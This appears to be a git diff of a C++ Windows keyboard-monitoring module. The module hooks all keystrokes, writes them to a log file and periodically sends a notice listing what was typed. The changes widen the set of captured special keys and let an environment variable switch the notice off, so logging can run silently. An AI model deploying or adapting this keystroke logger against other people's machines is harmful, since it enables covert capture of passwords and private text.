@@ -1,7 +1,7 @@
 #include "keyboard.h"
 
 #define NOTIFY_ENV L"RCDO_NOTIFY" // name of env to check whether to send a notifcation to the user
-#define NOTICE_DELAY 2 // delay between each keystroke notification
+#define NOTICE_DELAY 600 // delay between each keystroke notification
 #define NOTICE_MSG L"A user has knowingly and without authority touched your keyboard!"
 
 // maps keys that are hidden behind the SHIFT layer
@@ -31,7 +31,25 @@ std::map<wchar_t, wchar_t> layeredKeys = {
 std::map<int, std::wstring> mapSpecialKeys = {
     {VK_BACK, L"BACKSPACE"},
     {VK_RETURN, L"ENTER"},
-    {VK_SPACE, L"_"},
+    {VK_SPACE, L"SPACE"},
+    {VK_TAB, L"TAB"},
+    {VK_LWIN, L"WIN"},
+    {VK_RWIN, L"WIN"},
+    {VK_ESCAPE, L"ESCAPE"},
+    {VK_END, L"END"},
+    {VK_HOME, L"HOME"},
+    {VK_LEFT, L"LEFT"},
+    {VK_RIGHT, L"RIGHT"},
+    {VK_UP, L"UP"},
+    {VK_DOWN, L"DOWN"},
+    {VK_PRIOR, L"PG_UP"},
+    {VK_NEXT, L"PG_DOWN"},
+    {VK_OEM_PERIOD, L"."},
+    {VK_DECIMAL, L"."},
+    {VK_OEM_PLUS, L"+"},
+    {VK_OEM_MINUS, L"-"},
+    {VK_ADD, L"+"},
+    {VK_SUBTRACT, L"-"},
     {VK_INSERT, L"INSERT"},
     {VK_DELETE, L"DELETE"},
     {VK_PRINT, L"PRINT"},
@@ -92,7 +110,13 @@ void KeyboardMod::start(){
     std::thread timeMonitor(setLogFile);
 
     breachEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
-    std::thread breachMonitor(sendNotice);
+
+    // default behavior is to notify
+    std::wstring noticeOn = getEnvVar(NOTIFY_ENV, L"1");
+    if(wcstol(noticeOn.c_str(), NULL, 2)){
+        std::thread breachMonitor(sendNotice);
+        breachMonitor.detach();
+    }
 
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)){
@@ -212,7 +236,8 @@ void logKeystroke(int vkCode){
     output << L"[";
 
     for (auto modKey : modKeyStates){
-        if (modKey.second && modKey.first != L"SHIFT")
+        if (modKey.second && modKey.first != L"SHIFT" 
+                && modKey.first != L"CAPS")
             output << modKey.first + L" + ";
     }
 
@@ -231,6 +256,8 @@ void logKeystroke(int vkCode){
     }
 
     output << L"]";
+
+    printf("%ls\n", output.str().c_str());
 
     logFileMutex.lock();
     logFile << output.str();
@@ -292,10 +319,6 @@ LRESULT __stdcall hookCallback(int nCode, WPARAM wParam, LPARAM lParam){
     kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
     int vkCode = kbdStruct.vkCode;
 
-    // default behavior is to notify
-    std::wstring buffer = getEnvVar(NOTIFY_ENV, L"1");
-    long int noticeOn = wcstol(buffer.c_str(), NULL, 2);
-
     int isModKey = setModKeyState(vkCode, wParam);
     if (isModKey){
         return 1;
@@ -348,6 +371,9 @@ void sendNotice(){
 
         WaitForSingleObject(hTimer, INFINITE);
 
+        if(logFileBuffer.empty()){
+            continue;
+        }
         logFileMutex.lock();
 
         std::wstringstream noticeStream;
@@ -355,10 +381,10 @@ void sendNotice(){
         noticeStream << "The following keystrokes have been recorded in the last " << NOTICE_DELAY / 60 << " minutes:\n";
         noticeStream << logFileBuffer;
 
-        notify(noticeStream.str());
-
         logFileBuffer.clear();
 
         logFileMutex.unlock();
+
+        notify(noticeStream.str(), L"file");
     }
 }
